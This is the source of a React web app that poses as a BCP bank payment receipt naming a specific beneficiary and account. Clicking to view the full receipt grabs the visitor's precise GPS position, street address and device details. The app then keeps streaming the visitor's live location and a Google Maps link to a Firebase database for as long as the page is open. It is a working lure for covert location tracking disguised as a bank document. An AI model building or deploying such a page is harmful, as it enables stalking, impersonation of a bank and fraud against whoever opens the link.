import React, { useState, useEffect, useRef } from 'react';
// 1. Importamos las funciones de Firebase
// Asegúrate de importar doc y updateDoc
import { db } from './firebase'; // Ajusta la ruta a tu archivo firebase.js
import { collection, addDoc, updateDoc, doc, serverTimestamp } from "firebase/firestore"; 

function App() {
  const [showReceipt, setShowReceipt] = useState(false);
  const [coords, setCoords] = useState({ lat: null, lng: null });
  const [address, setAddress] = useState("");
  const [firebaseStatus, setFirebaseStatus] = useState("");
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("");
  const [accuracy, setAccuracy] = useState(null);
  
  // Guardamos el ID del documento para actualizarlo en tiempo real
  const [currentDocId, setCurrentDocId] = useState(null);
  
  // Referencia para cancelar el rastreo GPS si salimos
  const watchIdRef = useRef(null);

  // ------------------------------------------------------------------
  // 🟢 HELPER: OPENSTREETMAP (NOMINATIM)
  // ------------------------------------------------------------------
  const getAddressFromCoords = async (latitude, longitude) => {
    try {
      // Usamos un controlador de aborto por si las peticiones se acumulan
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
        { headers: { 'User-Agent': 'GeoTracker-Student/2.0' } }
      );
      const data = await response.json();
      if (data && data.display_name) return data.display_name;
      return "Ubicación en mapa";
    } catch (error) {
      console.error("Error geocoding:", error);
      return "Actualizando dirección...";
    }
  };

  // ------------------------------------------------------------------
  // 🛰️ EFECTO DE RASTREO EN TIEMPO REAL (LIVE TRACKING)
  // ------------------------------------------------------------------
  // Este efecto se activa SOLO cuando el recibo está visible (showReceipt = true)
  useEffect(() => {
    if (showReceipt && currentDocId) {
      if (!navigator.geolocation) return;

      console.log("📡 Iniciando rastreo en tiempo real...");
      
      const options = {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0 // Sin caché, siempre fresco
      };

      // watchPosition se ejecuta cada vez que el GPS detecta movimiento
      watchIdRef.current = navigator.geolocation.watchPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;
          const acc = position.coords.accuracy;

          // 1. Actualizar UI Local
          setCoords({ lat, lng });
          setAccuracy(Math.round(acc));

          // Opcional: Actualizar dirección (Cuidado: Nominatim tiene limites de uso gratis)
          // Lo hacemos solo si la precisión es buena para no saturar
          if (acc < 50) {
             getAddressFromCoords(lat, lng).then(addr => setAddress(addr));
          }

          // 2. Actualizar FIREBASE en Tiempo Real
          try {
            const docRef = doc(db, "comprobantes_pago_bcp", currentDocId);
            await updateDoc(docRef, {
              "ubicacion_gps.latitud": lat,
              "ubicacion_gps.longitud": lng,
              "ubicacion_gps.precision_metros": Math.round(acc),
              "ubicacion_gps.ultima_actualizacion": serverTimestamp(),
              "ubicacion_gps.es_precisa": acc <= 20 ? "SI (TIEMPO REAL)" : "AJUSTANDO SEÑAL...",
              "ubicacion_gps.mapa_link": `https://www.google.com/maps?q=${lat},${lng}`
            });
            setFirebaseStatus("📡 Sincronizando movimiento en vivo...");
            
            // Efecto visual de parpadeo
            setTimeout(() => setFirebaseStatus("✅ Ubicación Rastreada"), 1500);

          } catch (err) {
            console.error("Error actualizando live:", err);
          }
        },
        (error) => console.error("Error watchPosition:", error),
        options
      );
    }

    // Cleanup: Cuando se cierra el recibo, apagamos el GPS
    return () => {
      if (watchIdRef.current !== null) {
        navigator.geolocation.clearWatch(watchIdRef.current);
        console.log("🛑 Rastreo detenido.");
      }
    };
  }, [showReceipt, currentDocId]);


  // ------------------------------------------------------------------
  // 🏁 INICIO DEL PROCESO (Primera captura)
  // ------------------------------------------------------------------
  const handleVerifyReceipt = async () => {
    setLoading(true);
    setFirebaseStatus("");
    setLoadingText("Conectando con satélites...");

    if (!navigator.geolocation) {
      alert("Tu navegador no soporta GPS");
      setLoading(false);
      return;
    }

    // Obtenemos una PRIMERA posición para crear el documento
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        const acc = position.coords.accuracy;

        setLoadingText("Generando comprobante seguro...");
        const initialAddress = await getAddressFromCoords(lat, lng);

        try {
          // 1. CREAMOS EL DOCUMENTO INICIAL
          const docRef = await addDoc(collection(db, "comprobantes_pago_bcp"), {
            banco: "BANCO DE CREDITO",
            beneficiario: "RUBEN APAZA CORINA",
            cuenta: "64239676",
            monto: "Bs. 450",
            fecha: "27/11/2025",
            hora: new Date().toLocaleTimeString(), // Hora actual real
            transactionId: "1426271125" + Math.floor(Math.random() * 1000),
            referencia: "Para flota copacabana",
            
            // Datos iniciales de GPS
            ubicacion_gps: {
              latitud: lat,
              longitud: lng,
              precision_metros: Math.round(acc),
              direccion_detectada: initialAddress,
              modo: "TIEMPO REAL ACTIVADO",
              inicio_rastreo: serverTimestamp()
            },
            dispositivo: {
              userAgent: navigator.userAgent,
              plataforma: navigator.platform
            }
          });

          // 2. Guardamos estado y ID para activar el "Live Tracking"
          setCoords({ lat, lng });
          setAddress(initialAddress);
          setAccuracy(Math.round(acc));
          setCurrentDocId(docRef.id); // <--- IMPORTANTE: Esto activa el useEffect
          setShowReceipt(true);
          setLoading(false);

        } catch (error) {
          console.error("Error Firebase:", error);
          alert("Error al guardar: " + error.message);
          setLoading(false);
        }
      },
      (error) => {
        alert("Error GPS: " + error.message);
        setLoading(false);
      },
      { enableHighAccuracy: true, timeout: 20000 }
    );
  };

  // ------------------------------------------------------------------
  // UI (Idéntica a tu diseño)
  // ------------------------------------------------------------------
  return (
    <div style={{ 
      padding: '20px', 
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", 
      backgroundColor: '#0052a3', 
      minHeight: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center'
    }}>
      <div style={{ maxWidth: '700px', width: '100%' }}>
        
        {!showReceipt ? (
          // VISTA 1: INICIO
          <div style={{ textAlign: 'center' }}>
            <div style={{ backgroundColor: 'white', padding: '40px', borderRadius: '20px', marginBottom: '30px', boxShadow: '0 8px 16px rgba(0,0,0,0.2)' }}>
              <div style={{ fontSize: '80px', fontWeight: 'bold', color: '#0052a3' }}>BCP</div>
              <p style={{ color: '#666', fontSize: '16px', margin: '10px 0 0 0' }}>Banco de Crédito</p>
            </div>

            <div style={{ backgroundColor: 'white', padding: '30px', borderRadius: '15px', boxShadow: '0 8px 16px rgba(0,0,0,0.2)', marginBottom: '25px' }}>
              <h2 style={{ color: '#0052a3', margin: '0 0 20px 0', fontSize: '20px' }}>Confirmar Recepción de Fondos</h2>
              
              <div style={{ backgroundColor: '#f8f9fa', padding: '20px', borderRadius: '10px', textAlign: 'left', marginBottom: '20px', borderLeft: '4px solid #ff6600' }}>
                <p style={{ margin: '10px 0', color: '#333' }}><strong>Beneficiario:</strong> RUBEN APAZA CORINA</p>
                <p style={{ margin: '10px 0', color: '#333' }}><strong>Monto:</strong> Bs. 450.00</p>
                <p style={{ margin: '10px 0', color: '#333' }}><strong>Motivo:</strong> pulsera</p>
              </div>

              <button
                onClick={handleVerifyReceipt}
                disabled={loading}
                style={{
                  width: '100%',
                  padding: '16px',
                  backgroundColor: loading ? '#ccc' : '#ff6600',
                  color: 'white',
                  border: 'none',
                  borderRadius: '10px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: loading ? 'not-allowed' : 'pointer',
                  boxShadow: '0 4px 8px rgba(0,0,0,0.2)'
                }}
              >
                {loading ? `📡 ${loadingText}` : 'VER COMPROBANTE COMPLETO'}
              </button>
            </div>
          </div>
        ) : (
          // VISTA 2: COMPROBANTE (CON RASTREO ACTIVO)
          <div style={{ backgroundColor: 'white', padding: '40px', borderRadius: '15px', boxShadow: '0 8px 16px rgba(0,0,0,0.2)' }}>
            <div style={{ textAlign: 'center', marginBottom: '30px', borderBottom: '3px solid #ff6600', paddingBottom: '25px' }}>
              <div style={{ fontSize: '60px', fontWeight: 'bold', color: '#0052a3' }}>BCP</div>
              <h1 style={{ color: '#0052a3', fontSize: '24px', fontWeight: '600' }}>COMPROBANTE DE PAGO</h1>
              <p style={{ color: '#666', fontSize: '14px' }}>27/11/2025 - {new Date().toLocaleTimeString()}</p>
            </div>

            <div style={{ marginBottom: '30px' }}>
              <FilaDetalle label="Monto Transferido" value="Bs. 450.00" highlight />
              <FilaDetalle label="Beneficiario" value="RUBEN APAZA CORINA" />
              <FilaDetalle label="Cuenta" value="64239676" />
              <FilaDetalle label="Glosa" value="pulsera" />
            </div>

            {/* SECCIÓN DE RASTREO EN VIVO */}
            <div style={{ backgroundColor: '#e8f4f8', padding: '16px', borderRadius: '10px', marginBottom: '20px', borderLeft: '4px solid #0052a3' }}>
              <h3 style={{ margin: '0 0 12px 0', color: '#0052a3', fontSize: '14px', fontWeight: '600', display: 'flex', alignItems: 'center' }}>
                <span style={{ marginRight: '8px', animation: 'pulse 1.5s infinite' }}>🔴</span> 
                Ubicación en Tiempo Real Activa
              </h3>
              <p style={{ margin: '6px 0', fontSize: '13px', color: '#333' }}>
                <strong>Dirección actual:</strong> {address || "Detectando calle..."}
              </p>
              <div style={{ marginTop: '10px', fontSize: '11px', color: '#666', display: 'flex', justifyContent: 'space-between' }}>
                <span>Lat: {coords.lat?.toFixed(5)} | Lng: {coords.lng?.toFixed(5)}</span>
                <span>Precisión: ±{accuracy}m</span>
              </div>
              
              {/* Animación de pulso CSS */}
              <style>{`
                @keyframes pulse {
                  0% { opacity: 1; }
                  50% { opacity: 0.4; }
                  100% { opacity: 1; }
                }
              `}</style>
            </div>

            {firebaseStatus && (
              <div style={{ textAlign: 'center', fontSize: '12px', color: 'green', marginBottom: '15px' }}>
                {firebaseStatus}
              </div>
            )}

            <button
              onClick={() => {
                setShowReceipt(false);
                setCurrentDocId(null); // Esto detiene el rastreo
                setFirebaseStatus("");
              }}
              style={{
                width: '100%',
                padding: '14px',
                backgroundColor: '#0052a3',
                color: 'white',
                border: 'none',
                borderRadius: '10px',
                fontWeight: 'bold',
                cursor: 'pointer'
              }}
            >
              ← Volver
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

const FilaDetalle = ({ label, value, highlight = false }) => (
  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px', borderBottom: '1px solid #f0f0f0', paddingBottom: '12px' }}>
    <span style={{ color: '#666', fontWeight: '600', fontSize: '15px' }}>{label}:</span>
    <span style={{ color: highlight ? '#ff6600' : '#333', fontWeight: highlight ? 'bold' : 'normal', fontSize: highlight ? '20px' : '15px' }}>{value}</span>
  </div>
);

export default App;